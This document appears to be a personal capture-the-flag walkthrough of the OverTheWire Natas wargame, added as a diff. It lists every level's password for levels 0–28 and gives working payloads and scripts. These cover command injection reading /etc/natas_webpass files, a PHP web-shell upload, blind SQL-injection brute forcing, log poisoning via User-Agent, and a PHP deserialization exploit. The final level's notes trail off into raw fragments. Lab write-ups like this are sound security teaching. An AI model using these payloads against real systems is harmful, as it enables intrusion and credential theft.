@@ -1,0 +1,521 @@
+ntas0
+- If we inspect element, we see the password is a comment in the html in the body
+Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+natas1
+- We can right click as long as it is not on the textbox (might be bug)
+- Otherwise, F12 brings up the web inspector
+Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+natas2
+- We can see in inspect element that there is an image at files/pixel.png
+- We go to that link and see nothing.
+- We can go back one directory.
+- In /files/ we see users.txt
+- If we go to users.txt, we see the password for natas3
+Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+natas3
+- There is a comment saying not even google will find it this time 0 it refering to the user.txt
+- Let us see if that's true
+- We google the domain - natas3.natas.labsoverthewire.org
+- The first link is an index of /s3cr3t
+- Boom, we find users.txt and soon after natas4 password
+Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+natas4
+- We need to pretend we came from natas5
+- That is, we need to fake the referer
+- We can write a simple python program to do this
+
+#!usr/bin/python
+
+import requests
+
+URL = "http://natas4.natas.labs.overthewire.org/"
+USER = "natas4"
+PASS = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
+HEADER = {'referer':'http://natas5.natas.labs.overthewire.org/'}
+s = requests.session()
+s.headers.update(HEADER)
+
+r = s.get(URL, auth=(USER,PASS))
+print(r.text)
+
+Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+natas5
+- For some reason, we are not able to log in. Something is blocking us.
+- After messing around for a bit, I decided to take a look at the cookies.
+- There is a cookie named loggedin with a value of 0
+- Let's change it to one and rego on the website
+- Boom! Access granted.
+Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+natas6
+- This is a simple PHP program we have to decipher
+- We see that we want our submission to equal $secret
+- In order to find out what $secret is, we need to go into includes/secret.inc
+- We find that $secret = "FOEIUWGHFEEUHOFUOIU"
+- Let's enter that - and we get the password
+Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+natas7
+- We get told that the password for natas8 is in /etc/natas_webpass/natas8
+- Let's just simply go to that webpage 
+	-http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+- We find the password
+Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+natas8
+- This is another PHP program we need to decipher
+- They give us the secret pass, but it is encoded
+- We simply need to decode it
+- First we convert the hex to string
+- Then we reverse the string
+- Finally, get decode the string from base64 to ascii
+- We get oubWYf2kBq
+- We plug that in and we get the right password
+Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+natas9
+- If we look at the source code, we see that grep -i $key dictionary.txt is sent to the the passthru function and sent to the system
+- $key is the thing we put in
+- We can attempt to end the grep command and send our own
+- The $key we send in can be asdfasdf; cat /etc/natas_webpass/natas10
+- The command the passthru function sends would then be
+	- grep -i asdfasdf; cat /etc/natas_webpass/natas10 dictionary.txt
+- We can successfully inject our own command
+- Doing so, we get the password
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+natas10
+- The security breach we did in natas9 is now banned
+- We have to find a way to abuse the input system without using & | or ;
+- Let's rewrite the command
+	- grep -i $key dictionary.txt
+- We could potentially do this
+	- grep -i [someletter] /etc/natas_webpass/natas11 dictionary.txt
+- Having dictionary.txt makes things hard though
+- We can however just comment out dictionary.txt
+	- grep -i [someletter] /etc/natas_webpass/natas11 # dictionary.txt
+- Now we just need to find a letter that is contained in the password
+- I found that 'c' works
+	- grep -i c /etc/natas_webpass/natas11 # dictionary.txt
+	- $key = c /etc/natas_webpass/natas11 #
+Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+natas11
+- Let's slowly work backwards on this php problem
+- savaData(data) sets the cookie
+	- The cookie is ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
+- We need to find the key to the xor_encrypt function to continue going backwards
+- We know xor is the inverse of itself
+- Thus, the base64 decoded cookie xor json_encode($d) would give us the key
+- json_encode($d) is simply the $defaultdata
+- Let's reuse their code to find the key
+<?
+function xor_encrypt($in) {
+        $key = json_encode(array("showpassword"=>"no","bgcolor"=>"#ffffff"));
+        $text = $in;
+        $outText = '';
+
+        for($i=0;$i<strlen($text);$i++){
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+        }
+
+        return $outText;
+}
+
+$cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw');
+
+print xor_encrypt($cookie);  
+?>
+- Running this gets qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+- The key is qw8J
+- Let's create a new cookie with showpassword set to yes
+
+<?php
+function xor_encrypt($in) {
+        $key = 'qw8J';
+        $text = $in;
+        $outText = '';
+
+        for($i=0;$i<strlen($text);$i++){
+                $outText .= $text[$i] ^ $key[$i % strlen($key)];
+        }
+
+        return $outText;
+}
+
+$cookie = base64_encode(xor_encrypt(json_encode(array("showpassword"=>"yes","bgcolor"=>"#ffffff"))));
+
+print $cookie;
+?>
+
+- We get a new cookie: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+- Put the cookie in, reload the page
+Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+natas12
+- We see that the php for this level simply creates a random url and appends it with .jpg
+- We can first write some php that will execute to reveal the password
+<?php
+
+passthru("cat /etc/natas_webpass/natas13");
+
+?>
+
+- Now we just have to figure out a way upload the file while avoiding the .jpg appending
+- If we take a look in inspect element, we see in a hidden tag that the value is set to a random string + .jpg
+- We will just change this to .php
+- We upload the file and boom, we get the password
+Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+natas13
+- This problem is a lot simpler
+- The exif_imagetype function only checks the first few bytes of the file
+- We can fake the file to be a jpeg by adding FFD8FFFE to the first couple bytes
+- Now we can submit the file
+- If we do the same thing as last time, we get the password
+Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+natas14
+- This is similar to a previous problem
+- We have to inject our own code into the login boxes
+- We see $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+- Essentially, this is SELECT * from users where username="someusername" and password="somepassword"
+- In place of someusername and somepassword, we need to inject something to make the statement true
+- We can do username="" OR "1"="1" and password="" OR "1"="1"
+- That is we enter " OR "1"="1 for both fields in order to make the statement true
+Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+natas15
+- This is sort of a brute force problem
+- Since the input is still not sanatized, and we also get the labels of the SQL table, we can check if the password column contains an input by inputting...
+	- natas16" AND password LIKE BINARY "%character%
+- Once we know all the characters, we can start piecing it together
+	- natas16" AND password LIKE BINARY "password%
+- Here is my python program for this:
+
+#!/user/bin/python
+
+import requests
+
+URL = "http://natas15.natas.labs.overthewire.org/index.php"
+USER = "natas15"
+PASS = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
+CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnoprqstuvwxyz0123456789"
+POSSIBLE = ""
+KEY = ""
+
+def check_existence(value):
+    r = requests.post(URL, data = {'username':value}, auth = (USER,PASS))
+    if 'This user exists.' in r.text:
+        return True
+
+
+def value_input():
+    for char in CHARSET:
+        if check_existence("natas16\" AND password LIKE BINARY \"%" + char + "%") is True:
+            global POSSIBLE
+            POSSIBLE += char
+
+def get_key():
+    for k in range(31):
+        for char in POSSIBLE:
+            global KEY
+            if check_existence("natas16\" AND password LIKE BINARY \"" + KEY + char + "%") is True:
+                KEY += char
+                print KEY
+		break
+def main():
+    value_input()
+    get_key()
+    print KEY
+
+main()
+
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+natas16
+- This is another injection problem
+- We can no longer use most special characters, however we still have access to $ and ()
+- Thus, if we do this, we can check if the password contains this character
+	- $(grep character /etc/natas_webpass/natas17)
+- If we do this, we can deduce the order
+	- $(grep ^passtestcharacter /etc/natas_webpass/natas17)
+- Here is my basic python program:
+
+#!user/bin/python
+
+import requests
+
+URL = "http://natas16.natas.labs.overthewire.org/index.php"
+USER = "natas16"
+PASS = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+POSSIBLE = ""
+KEY = ""
+
+def check_existence(value):
+    r = requests.post(URL, data = {'needle':value}, auth = (USER,PASS))
+    if 'injection' not in r.text:
+        return True
+
+def value_input():
+    for char in CHARSET:
+        if check_existence("$(grep " + char + " /etc/natas_webpass/natas17)injection") is True:
+            global POSSIBLE
+            POSSIBLE += char
+
+def get_key():
+    for k in range(31):
+        for char in POSSIBLE:
+            global KEY
+            if check_existence("$(grep ^" + KEY + char + " /etc/natas_webpass/natas17)injection") is True:
+                KEY += char
+                print KEY
+                break
+
+def main():
+    value_input()
+    get_key()
+    print KEY
+
+main()
+
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+natas17
+I strongly believe natas17 is broken. //xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+natas18
+- There are 640 session ids.
+- When we log on, we get a cookie with a random session id below 640
+- From the code, we can deduce on of these session ids must be the admin id.
+- We can brute force this
+
+#!usr/bin/python
+
+import requests
+URL = "http://natas18.natas.labs.overthewire.org/index.php"
+USER = "natas18"
+PASS = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
+
+def check_admin(value):
+    r = requests.get(URL, cookies = {'PHPSESSID':value}, auth = (USER,PASS))
+    if "You are an admin" in r.text:
+        return True
+    else:
+        return False
+
+def cookie_loop():
+    for k in range(0,640):
+        if check_admin(str(k)) is True:
+            print k
+            break
+        else:
+            print str(k) + " Not this one"
+
+cookie_loop()
+
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+natas19
+- The session ids are no longer sequential
+- If I log in as aaa, I get the cookie: 3136382d616161 or 168-aaa
+- If I log in as bbb, I get the cookie: 31362d626262 or 16-bbb
+- If I log in as ccc, I get the cookie: 36372d636363 or 67-ccc
+- We can see it is #-username in hex
+- We can reuse our program from the last level and have our username be admin
+
+#!usr/bin/python
+
+import requests, binascii
+URL = "http://natas19.natas.labs.overthewire.org/index.php"
+USER = "natas19"
+PASS = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
+
+def check_admin(value):
+    r = requests.get(URL, cookies = {'PHPSESSID':value}, auth = (USER,PASS))
+    if "You are an admin" in r.text:
+        return True
+    else:
+        return False
+
+def cookie_loop():
+    for k in range(0,640):
+        value = (str(binascii.hexlify(str(k)+"-admin"))).replace("b","").replace("'","")
+        if check_admin(value) is True:
+            print value
+            break
+        else:
+            print str(k) + " Not this one"
+
+- We find that 595-admin is the correct cookie, that is 3539352d61646d696e in hex
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+natas20
+- This was an interesting problem
+- First, the myread function seperates the data file by \n, then by spaces
+- Second, the mywrite function appends $key $value\n
+- Third, our input is not sanatized, only our cookie is.
+- Our goal is to have a key of admin equal to 1
+- We see that the mywrite function writes in the key like this
+	name something
+	admin 0
+- And so on
+- We can thus enter something\nadmin 1 in order to get the mywrite function to write
+	name something
+	admin 1
+- Then we enter something else to get myread to read the data
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+natas21
+- We can pass the admin = 1 key and value through modification of the URL. The form is very insecure.
+	- http://natas21-experimenter.natas.labs.overthewire.org/?admin=1
+- Now we can transfer the session ID over from this website to the original. Colocation shares $_SESSION data.
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+natas22
+- We just need to avoid the redirect for this level
+
+#!usr/bin/python
+
+import requests
+
+URL = "http://natas22.natas.labs.overthewire.org/index.php?revelio=true"
+USER = "natas22"
+PASS = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
+
+r = requests.get(URL, auth=(USER,PASS), allow_redirects=False)
+print(r.text)
+
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+natas23
+- This is weird php conversion.
+- We can enter 11iloveyou to satisfy both conditions
+- The 11 in front makes it greater than 11
+- The iloveyou makes it satisfy the strstr
+Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+natas24
+- The program uses strcmp to check if the passwords match
+- If the strcmp returns 0, we get the next level pass.
+- The exploit with strcmp is if you error the comparison, it returns 0
+- We can simply send an array to cause this error
+	- http://natas24.natas.labs.overthewire.org/?passwd[]=test
+Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+natas25
+- The php program prints the user-agent to the log at /tmp/natas25_SESSID.log
+- We can control both what it prints and the location where it prints
+- We can spoof the user-agent to a php command
+
+#!usr/bin/python
+
+import requests
+URL = "http://natas25.natas.labs.overthewire.org"
+PASS = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
+USER = "natas25"
+HEADER = {"User-Agent" : "<?php passthru('cat /etc/natas_webpass/natas26'); ?>"}
+
+s = requests.Session()
+
+s.headers.update(HEADER)
+
+URL_LOG = "http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././tmp/natas25_h4cked.log"
+
+r = s.get(URL_LOG, auth=(USER, PASS), headers=HEADER, cookies={'PHPSESSID':'h4cked'})
+
+print(r.text)
+
+Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+natas26
+
+- The program does not sanitize the deserialization of $drawing
+- We can create a cookie to abuse this
+
+<?php
+
+class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="";
+            $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27'); ?>";
+            $this->logFile = "img/hacked.php";
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+
+print(base64_encode(serialize(new Logger())));
+?>
+
+- The php program creates a new Logger object that will cat /etc/natas_Webpass/natas26 on destruct
+- It will log the output in img/hacked.php
+- We run the program and generate a new base64_encoded cookie
+- We can run a python program to fish the result out
+
+#!usr/bin/python
+
+import requests
+
+URL = "http://natas26.natas.labs.overthewire.org/"
+USER = "natas26"
+PASS = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
+cookies = {"drawing": "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL2hhY2tlZC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MjoiPD9waHAgcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=="}
+
+r = requests.get(URL, auth = (USER, PASS), cookies = cookies)
+
+URL_PASS = "http://natas26.natas.labs.overthewire.org/img/hacked.php"
+r = requests.get(URL_PASS, auth = (USER, PASS))
+
+print(r.text)
+
+Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+natas27
+- First, mysql_fetch_assoc only checks for the username. If we can get a duplicate natas28 user, we can dump the data of the original natas28.
+- MySQL truncates the data if it is too long. By inputting the username as 
+natas28                                                      (many spaces)...a
+MySQL will truncate the username to simply natas28
+- Doing so, we can create a duplicate user
+- Logging in gives us the password
+Password: JWwR438wkgTsNKBbcJoowyysdM82YjeF
+
+natas28
+
+asdf - G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP JyuJN4JsfEV0tjnwsT7stHK Sh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
+
+sdfg - G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP J4FASpKEuWzR2CxvaWmyC8K Sh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
+
+a - G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KriAqPE2++uYlniRMkobB1 vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+
+b- G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP IYiwNnSJY7KHJGU+XjuMzV vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+--
+
+l7VHcq8o6
